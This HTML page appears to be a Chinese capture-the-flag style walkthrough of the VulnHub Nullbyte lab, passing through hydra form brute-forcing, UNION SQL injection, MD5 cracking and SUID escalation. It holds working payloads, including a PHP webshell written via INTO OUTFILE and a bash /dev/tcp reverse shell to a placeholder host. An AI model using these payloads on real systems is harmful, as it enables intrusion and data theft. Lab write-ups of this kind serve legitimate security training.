+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921571.png" alt="image-20251222202149587"></p>
+<p><strong>提权成功</strong></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong>提权部分我发现 polkit 有 suid 权限，通过搜索发现可以用 polkit 提权：CVE-2021-4034</strong></p>
+<p><strong>&#x2F;&#x2F;</strong></p>
+<p><strong>在靶机上运行 40839.c 会导致系统崩溃，Apport&#x2F;Arbt 可以捕获应用程序崩溃的信息，可以提权</strong></p>
+<p><strong>&#x2F;&#x2F;</strong></p>
+<p><strong>CVE-2021-4034</strong> <strong>影响范围：所有主流 Linux 发行版本均受影响</strong> <strong>这个利用可以通杀很多老内核的 linux 靶机。</strong></p>
+<p><strong>&#x2F;&#x2F;</strong></p>
+<h3 id="什么是-Apport？"><a href="#什么是-Apport？" class="headerlink" title="什么是 Apport？"></a><strong>什么是 Apport？</strong></h3><p><strong>Apport 是 Ubuntu 的系统错误报告工具，用于：</strong></p>
+<ul>
+<li><strong>自动收集程序崩溃信息</strong></li>
+<li><strong>生成错误报告</strong></li>
+<li><strong>将报告发送给开发者进行调试</strong></li>
+</ul>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong>渗透测试的利用</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">信息收集</span><br><span class="line"># 查看崩溃报告（可能包含敏感信息）</span><br><span class="line">ls -la /var/crash/</span><br><span class="line">cat /var/crash/*.crash 2&gt;/dev/null | grep -E &quot;(password|key|token|secret)&quot;</span><br><span class="line"></span><br><span class="line"># 查找包含核心转储的文件</span><br><span class="line">find /var/crash -name &quot;*.crash&quot; -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">提取核心转储</span><br><span class="line"># 核心转储可能包含内存中的敏感数据</span><br><span class="line"># 提取崩溃的程序信息</span><br><span class="line">apport-unpack /var/crash/_usr_bin_program.crash /tmp/extracted/</span><br><span class="line"></span><br><span class="line"># 查看提取的文件</span><br><span class="line">ls -la /tmp/extracted/</span><br></pre></td></tr></table></figure>
+
+<h1 id="Nullbyte-SQL-注入大赏，4-种注入方式，1-次呈现！"><a href="#Nullbyte-SQL-注入大赏，4-种注入方式，1-次呈现！" class="headerlink" title="Nullbyte - SQL 注入大赏，4 种注入方式，1 次呈现！"></a>Nullbyte - SQL 注入大赏，4 种注入方式，1 次呈现！</h1><p><strong>靶机精讲之 Nullbyte。涉及 Hydra 表单暴力破解，John md5 哈希暴力破解，手工 SQL 注入数据库信息猜解、SQL 注入数据库写入一句话木马、写入反弹 shell，使用 SQLmap 自动化注入，可谓 SQL 注入技能大赏。提权用具有 suid 权限的可执行文件，执行我们写入的 shell 的方式实现。很精彩的一台 sql 注入为主的靶机，值得研究和学习。vulnhub 上可以下载靶机供边看视频边实操。</strong></p>
+<h2 id="nmap-扫描-3"><a href="#nmap-扫描-3" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><p><strong>靶机 IP 192.168.95.27</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921572.png" alt="image-20251222204221104"></p>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong>这里的</strong><code>ssh</code> 端口是 777 不是默认的 22</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921573.png" alt="image-20251222204408882"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921574.png" alt="image-20251222204446009"></p>
+<p><strong>UDP 端口全开</strong></p>
+<h3 id="RPC-在非常重要，需要关注"><a href="#RPC-在非常重要，需要关注" class="headerlink" title="RPC 在非常重要，需要关注"></a>RPC 在非常重要，需要关注</h3><blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<h2 id="渗透测试-Checklist"><a href="#渗透测试-Checklist" class="headerlink" title="渗透测试 Checklist"></a><strong>渗透测试 Checklist</strong></h2><ol>
+<li><strong>端口扫描</strong>：<code>nmap -p 111,135,139,445,2049</code></li>
+<li><strong>RPC 枚举</strong>：<code>rpcinfo -p target</code></li>
+<li><strong>NFS 检查</strong>：<code>showmount -e target</code>  提权精讲有相关内容</li>
+<li><strong>NIS 检查</strong>：<code>ypwhich</code>，<code>domainname</code></li>
+<li><strong>尝试挂载</strong>：<code>mount -t nfs</code></li>
+<li><strong>提取数据</strong>：<code>ypcat passwd</code>，搜索共享文件</li>
+<li><strong>漏洞利用</strong>：检查已知漏洞（CVE）</li>
+<li><strong>权限提升</strong>：利用 <code>no_root_squash</code></li>
+<li><strong>横向移动</strong>：通过共享或窃取的凭据</li>
+<li><strong>清理痕迹</strong>：卸载共享，删除文件</li>
+</ol>
+<p><strong>RPC 在渗透测试中是****黄金目标</strong>，因为：</p>
+<ol>
+<li><strong>通常配置不当（no_root_squash）</strong></li>
+<li><strong>泄露大量信息（用户、密码哈希）</strong></li>
+<li><strong>可作为横向移动的跳板</strong></li>
+<li><strong>很多管理员忽略了其安全性</strong></li>
+</ol>
+<p><strong>特别关注</strong>：<code>/etc/exports</code> 配置和 NIS 域名猜解，这两个是常见的突破口。</p>
+</blockquote>
+<h2 id="Web-渗透-1"><a href="#Web-渗透-1" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921575.png" alt="image-20251222205051779">		<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921576.png" alt="image-20251222205129679">源码</p>
+<h3 id="图片信息详细"><a href="#图片信息详细" class="headerlink" title="图片信息详细"></a>图片信息详细</h3><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921577.png" alt="image-20251222205437931"></p>
+<h4 id="exiftool-专门用来查看图片的工具"><a href="#exiftool-专门用来查看图片的工具" class="headerlink" title="exiftool  专门用来查看图片的工具"></a><code>exiftool</code>  专门用来查看图片的工具</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921578.png" alt="image-20251222205517345">		<strong>comment 评论：内容是一个</strong><code>抽象的笑脸</code>，这串英文要重点关注</p>
+<p><code>kzMb5nVYJw</code></p>
+<h4 id="其他工具还有-string-binwalk"><a href="#其他工具还有-string-binwalk" class="headerlink" title="其他工具还有 string**	**binwalk"></a>其他工具还有 string**	**binwalk</h4><h3 id="用-kzMb5nVYJw-进行-ssh-连接"><a href="#用-kzMb5nVYJw-进行-ssh-连接" class="headerlink" title="用 kzMb5nVYJw 进行 ssh 连接"></a>用 <code>kzMb5nVYJw</code> 进行 ssh 连接</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921579.png" alt="image-20251222211243936"></p>
+<h3 id="目录爆破-2"><a href="#目录爆破-2" class="headerlink" title="目录爆破"></a>目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gobuster dir -u url -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt #字典位置</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921580.png" alt="image-20251222205734807"></p>
+<h4 id="JavaScript-禁止访问"><a href="#JavaScript-禁止访问" class="headerlink" title="JavaScript 禁止访问"></a>JavaScript 禁止访问</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921581.png" alt="image-20251222210718887"></p>
+<h4 id="uploads-访问了也没有信息"><a href="#uploads-访问了也没有信息" class="headerlink" title="uploads 访问了也没有信息"></a>uploads 访问了也没有信息</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921582.png" alt="image-20251222211018129"></p>
+<h4 id="用-kzMb5nVYJwphpmyadmin-登录失败"><a href="#用-kzMb5nVYJwphpmyadmin-登录失败" class="headerlink" title="用 kzMb5nVYJw	phpmyadmin 登录失败"></a>用 <code>kzMb5nVYJw</code>	<strong>phpmyadmin 登录失败</strong></h4><p><strong>登录用</strong><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921583.png" alt="image-20251222211142246">不行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921584.png" alt="image-20251222211159731"></p>
+<h3 id="用-kzMb5nVYJw-作为-url-路径-成功"><a href="#用-kzMb5nVYJw-作为-url-路径-成功" class="headerlink" title="用 kzMb5nVYJw 作为 url 路径**	**成功"></a>用 <code>kzMb5nVYJw</code> 作为 url 路径**	**成功</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921585.png" alt="image-20251222211515094"></p>
+<p><strong>这是一个类似于密码输入框的东西</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921586.png" alt="image-20251222213413683"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921587.png" alt="image-20251222211639127"></p>
+<p><strong>源码有提示：没连接数据库，密码也不复杂</strong></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p>**那万能密码就没用了 **<code>1&#39; or 1=1#</code></p>
+<p><strong>只能进行暴力破解</strong></p>
+</blockquote>
+<h2 id="hydra-暴力破解-web-表单"><a href="#hydra-暴力破解-web-表单" class="headerlink" title="hydra 暴力破解 web 表单"></a>hydra 暴力破解 web 表单</h2><p><strong>基本使用规则</strong></p>
+<h3 id="A-GET-请求表单"><a href="#A-GET-请求表单" class="headerlink" title="A. GET 请求表单"></a><strong>A. GET 请求表单</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 简单 GET 登录</span><br><span class="line">hydra -L users.txt -P passwords.txt http-get://目标IP/login.php</span><br><span class="line"></span><br><span class="line"># 带参数的 GET</span><br><span class="line">hydra -L users.txt -P passwords.txt 目标IP http-get-form \ &quot;/login.php:username=^USER^&amp;password=^PASS^:F=错误标识&quot;</span><br><span class="line"></span><br><span class="line"># 示例：WordPress GET 登录</span><br><span class="line">hydra -L users.txt -P passwords.txt 目标IP http-get-form \ &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=incorrect&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="B-POST-请求表单（最常见）"><a href="#B-POST-请求表单（最常见）" class="headerlink" title="B. POST 请求表单（最常见）"></a><strong>B. POST 请求表单（最常见）</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 基本格式</span><br><span class="line">hydra -L users.txt -P passwords.txt 目标IP http-post-form \ &quot;/login.php:username=^USER^&amp;password=^PASS^:错误提示&quot;</span><br><span class="line"></span><br><span class="line"># 完整示例</span><br><span class="line">hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form \ &quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;submit=Login:Invalid username or password&quot;</span><br><span class="line"></span><br><span class="line"># 带 Cookie 的情况</span><br><span class="line">hydra -L users.txt -P passwords.txt 目标IP http-post-form \ &quot;/login.php:username=^USER^&amp;password=^PASS^:F=错误:S=Cookie:session=abc123&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="此处的构造"><a href="#此处的构造" class="headerlink" title="此处的构造"></a>此处的构造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.95.27 http-post-form &quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot; -l 这里没用用户名输入框，但是必要参数 -p /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921588.png" alt="image-20251222212547761"></p>
+<p>**成功破解出密码 **<code>elite</code>	<strong>成功登录</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921589.png" alt="image-20251222213512367">    源码    <img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921591.png" alt="image-20251222213808730"></p>
+<p><strong>然我们搜索用户名</strong></p>
+<p>**输入 **<code>ab</code>	<strong>提示我们成功取回数据</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921592.png" alt="image-20251222213647408"></p>
+<p>**输入一个字母 **<code>a</code>	<strong>获得一个用户名</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921593.png" alt="image-20251222213725424"></p>
+<h2 id="SQL-注入-常规注入查数据库信息"><a href="#SQL-注入-常规注入查数据库信息" class="headerlink" title="SQL 注入-常规注入查数据库信息"></a>SQL 注入-常规注入查数据库信息</h2><p><strong>随便输入，提示成功取回数据，但什么都不显示</strong></p>
+<p><strong>什么都不输入</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921594.png" alt="image-20251222213959022"></p>
+<p><strong>多次输入测试，就是根据输入的字母匹配相关的用户 NAME</strong></p>
+<p><strong>没有匹配的就以空数据返回</strong></p>
+<p><strong>url 的</strong><code>usrtosearch=&#39;</code> 或输入框 <code>&#39;</code> **	**构造也都没有报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921595.png" alt="image-20251222214206707"></p>
+<h3 id="判断匹配字符"><a href="#判断匹配字符" class="headerlink" title="判断匹配字符"></a>判断匹配字符</h3><p><code>) 或 &amp; 或 + 或 &quot;	-- -</code>	<strong>只要有一个能和前面的匹配上就会报错</strong></p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>这里的</strong><code>-- -</code> 是因为 sql 注入<strong>注释符的 <code>--</code> 后面必须有一个空格</strong>，为了只管看到你**”加了“**这个空格，可以多打一个任意字符</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921596.png" alt="image-20251222214540761"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921597.png" alt="image-20251222214637037"></p>
+<p>**这里单独给双引号 **<code>&quot;</code> 会报错</p>
+<h3 id="order-by-判断列数"><a href="#order-by-判断列数" class="headerlink" title="order by 判断列数"></a>order by 判断列数</h3><p><code>&quot; order by 1/2/3/4 -- -</code> 直到数字 <code>4</code> 的时候报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921598.png" alt="image-20251223192110130"></p>
+<h3 id="联合查询判断列数"><a href="#联合查询判断列数" class="headerlink" title="联合查询判断列数"></a>联合查询判断列数</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921599.png" alt="image-20251222214819101"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921600.png" alt="image-20251222214802630"></p>
+<p><strong>发现报错信息为****select 的数和列数不同</strong>，那我不断加上各个列，直到于数据库列数相同即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921601.png" alt="image-20251222214937950"></p>
+<p><code>union select 1,2,3; -- -</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921602.png" alt="image-20251222215114734"></p>
+<p><strong>数据表格一共三列</strong></p>
+<h3 id="database-version-version-user-的查询"><a href="#database-version-version-user-的查询" class="headerlink" title="database()**	@@version  &#x2F; version()	user()	**的查询"></a>database()**	<strong>@@version  &#x2F; version()</strong>	<strong>user()</strong>	**的查询</h3><p><code>&quot; union select database(),@@version,user(); -- -</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921603.png" alt="image-20251222220358928"></p>
+<p><strong>成功爆出数据库，版本，当前用户</strong></p>
+<h3 id="爆出整个-mysql-数据库的所有数据库和各数据库的表名"><a href="#爆出整个-mysql-数据库的所有数据库和各数据库的表名" class="headerlink" title="爆出整个 mysql 数据库的所有数据库和各数据库的表名"></a>爆出整个 mysql 数据库的所有数据库和各数据库的表名</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921604.png" alt="image-20251223184703676"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select table_schema,table_name,3 from information_schema.tables;-- -</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>table_schema</strong>	<strong>数据库名</strong></p>
+<p><strong>table_name</strong>	<strong>数据库里面的表名</strong></p>
+<p><code>INFORMATION_SCHEMA.TABLES</code> 是 MySQL&#x2F;MariaDB 中一个重要的<strong>元数据视图</strong>，它提供了数据库中所有<strong>表</strong>（包括基础表和视图）的元数据信息，让你无需直接查询系统表就能获取表的结构信息。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921605.png" alt="image-20251223184945162"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921606.png" alt="image-20251223184625013"></p>
+<h3 id="seth-这个数据库里面的表名"><a href="#seth-这个数据库里面的表名" class="headerlink" title="seth 这个数据库里面的表名"></a>seth 这个数据库里面的表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select table_name,2,3 from information_schema.tables where table_shema=&quot;seth&quot;;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921607.png" alt="image-20251223185601990"></p>
+<p><strong>只有 users 这一个表</strong></p>
+<h3 id="查看-seth-数据库的-users-表中的列有多少个字段"><a href="#查看-seth-数据库的-users-表中的列有多少个字段" class="headerlink" title="查看 seth 数据库的 users 表中的列有多少个字段"></a>查看 seth 数据库的 users 表中的列有多少个字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select column_name,2,3 from information_schema.columns where table_schema=&quot;seth&quot; and table_name=&quot;users&quot;;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921608.png" alt="image-20251223190116129"></p>
+<p><strong>看到有者四个字段的信息</strong></p>
+<h3 id="查看-seth-数据库的-users-表中的所有信息"><a href="#查看-seth-数据库的-users-表中的所有信息" class="headerlink" title="查看 seth 数据库的 users 表中的所有信息"></a>查看 seth 数据库的 users 表中的所有信息</h3><p><strong>只有三个回显位置，一次取不完</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select id,user,pass from users;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921609.png" alt="image-20251223190421231"></p>
+<p><strong>得到了</strong><code>ramses</code> 的 pass 密码</p>
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><strong>看起来像 base64</strong></p>
+<p><strong>kali 中解密或网上的工具都可以破解</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921610.png" alt="image-20251223190628768"></p>
+<h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h3><p><strong>破解出的一串又像是密文，用</strong><code>hash-identifier</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921611.png" alt="image-20251223190817551"></p>
+<p><strong>很可能是 MD5 加密</strong></p>
+<h3 id="john-破解"><a href="#john-破解" class="headerlink" title="john 破解"></a>john 破解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=raw-md5 --wordlists=/usr/share/wordlists/rockyou.txt password</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921612.png" alt="image-20251223190957873"></p>
+<p><strong>密码为 omega</strong></p>
+<p>**因为这是从数据库中取得的密码数据，可以尝试的地方有 **<strong>phpMyAdmin</strong> 和 <strong>ssh</strong></p>
+<p><strong>先尝试****ssh</strong></p>
+<h2 id="获得初始-shell-1"><a href="#获得初始-shell-1" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>注意 <code>ssh</code> 连接的端口为 777 不是默认的 22</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921613.png" alt="image-20251223191502453"></p>
+<h2 id="SQL-注入-写入一句话木马-小马-–一般成功概率很低"><a href="#SQL-注入-写入一句话木马-小马-–一般成功概率很低" class="headerlink" title="SQL 注入-写入一句话木马(小马)–一般成功概率很低"></a>SQL 注入-写入一句话木马(小马)–一般成功概率很低</h2><blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong><code>secure_file_priv</code> 为空才能成功</strong></p>
+<p><strong>只要无法写</strong><code>into outfile</code> 就不为空，此路不通</p>
+</blockquote>
+<p><code>into outfile &quot;/var/www/html/uploads/shell.php&quot;</code> - 将 Webshell 写入服务器</p>
+<p><code>/var/www/html/</code> 是一般 web 的路径</p>
+<p><code>uploads</code> 是我们爆破出来的目录文件夹，能不能访问不重要，但肯定有上传功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select &quot;&lt;?php system($_GET[&#x27;RedteamNotes&#x27;]);?&gt;&quot;,&quot;&quot;,&quot;&quot; into outfile &quot;/var/www/html/uploads/shell.php&quot;; -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921614.png" alt="image-20251223192514793"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921615.png" alt="image-20251223193135491">	<strong>成功写入木马</strong></p>
+<h3 id="获得-webshell"><a href="#获得-webshell" class="headerlink" title="获得 webshell"></a>获得 <code>webshell</code></h3><p><strong>完全服务器控制</strong> - 攻击者可以通过 URL 执行任意系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://目标网站/uploads/shell.php?RedteamNotes=whoami</span><br><span class="line">http://目标网站/uploads/shell.php?RedteamNotes=cat+/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>ls</strong>	<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921616.png" alt="image-20251223193241113">	<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921617.png" alt="image-20251223193607533"></p>
+<p><strong><code>cat%20/etc/passwd</code></strong>	<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921618.png" alt="image-20251223193647264"></p>
+<p>**这时可以：比如反弹 shell 方式多种多样，可以参考本目录下的 ****<code>获得Webshell后获取初始Shell的常用方法</code>**</p>
+<p><strong>也可以看看下面的思路</strong></p>
+<h3 id="⚠️cat-可以执行-sql-命令的文件的内容，看是否有数据库连接的账户密码"><a href="#⚠️cat-可以执行-sql-命令的文件的内容，看是否有数据库连接的账户密码" class="headerlink" title="⚠️cat 可以执行 sql 命令的文件的内容，看是否有数据库连接的账户密码"></a>⚠️cat 可以执行 sql 命令的文件的内容，看是否有数据库连接的账户密码</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921589.png" alt="image-20251222213512367">	<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921592.png" alt="image-20251222213647408"></p>
+<p>**我们进行数据库 sql 注入查询的时候，在 **<code>192.168.95.27/kzMb5nVYJw/420search.php?</code> 页面中执行了 sql 查询，我们就有理由怀疑，<code>420search.php</code> 文件里有数据库连接相关的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921619.png" alt="image-20251223195611744"></p>
+<p>**数据库连接的账户 **<code>root</code> 密码 <code>sunnyvale</code>	<strong>可以</strong><code>ssh</code> 密码复用的碰撞，也可以 <code>phpMyAdmin</code> 登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921620.png" alt="image-20251223195812152">			<strong>成功登录数据库，拿到 ramses 的 ssh 连接信息</strong></p>
+<h2 id="SQL-注入-写入反弹-shell-大马-–"><a href="#SQL-注入-写入反弹-shell-大马-–" class="headerlink" title="SQL 注入-写入反弹 shell(大马)–"></a>SQL 注入-写入反弹 shell(大马)–</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select &quot;&lt;?php exec(\&quot;/bin/bash -c&#x27;bash -i &gt;&amp; /dev/tcp/kaliIP/1234 0&gt;&amp;1&#x27;\&quot;);?&gt;&quot;,&quot;&quot;,&quot;&quot; into outfile &quot;/var/www/html/uploads/sh.php&quot;; -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921621.png" alt="image-20251223200440841"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921615.png" alt="image-20251223193135491">	<strong>成功写入</strong></p>
+<p>**kali 建立监听 **	<code>sudo nc -lvnp 1234</code></p>
+<p><strong>web 访问 uploads&#x2F;sh.php</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921622.png" alt="image-20251223200848079"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921623.png" alt="image-20251223200932118"></p>
+<p><strong>成功获得反弹 shell</strong></p>
+<p><strong>依旧可以找到</strong><code>420search.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921624.png" alt="image-20251223204859488"></p>
+<h2 id="SQL-注入-sqlmap-自动"><a href="#SQL-注入-sqlmap-自动" class="headerlink" title="SQL 注入-sqlmap 自动"></a>SQL 注入-<code>sqlmap</code> 自动</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921625.png" alt="image-20251223205106346"></p>
+<h3 id="数据库的表"><a href="#数据库的表" class="headerlink" title="数据库的表"></a>数据库的表</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921626.png" alt="image-20251223205144807"></p>
+<h3 id="表中的字段"><a href="#表中的字段" class="headerlink" title="表中的字段"></a>表中的字段</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921627.png" alt="image-20251223205312092"></p>
+<h3 id="dump-转储表中的所有内容"><a href="#dump-转储表中的所有内容" class="headerlink" title="dump 转储表中的所有内容"></a>dump 转储表中的所有内容</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921628.png" alt="image-20251223205356572"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921629.png" alt="image-20251223205415083"></p>
+<h2 id="SUID-可执行文件提权"><a href="#SUID-可执行文件提权" class="headerlink" title="SUID 可执行文件提权"></a>SUID 可执行文件提权</h2><p><strong>无法列出 sudo 可执行权限</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921630.png" alt="image-20251223205627281"></p>
+<p><strong>看 SUID 位的文件</strong>	<code>find / -perm u=s -type f 2&gt;/dev/null</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921631.png" alt="image-20251223205803163"></p>
+<p><code>find / -group ramses -type f 2&gt;/dev/null | grep -v &#39;/proc&#39;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921632.png" alt="image-20251223205900429"></p>
+<p><strong>查找</strong><code>ramses</code> 用户组中的文件，自己<strong>有执行权限</strong></p>
+<blockquote>
+<p><strong><code>grep -v &#39;/proc&#39;</code></strong>  过滤掉包含”&#x2F;proc”的行  排除&#x2F;proc 目录下的文件</p>
+<h3 id="为什么排除-proc-目录？"><a href="#为什么排除-proc-目录？" class="headerlink" title="为什么排除&#x2F;proc 目录？"></a><strong>为什么排除&#x2F;proc 目录？</strong></h3><ul>
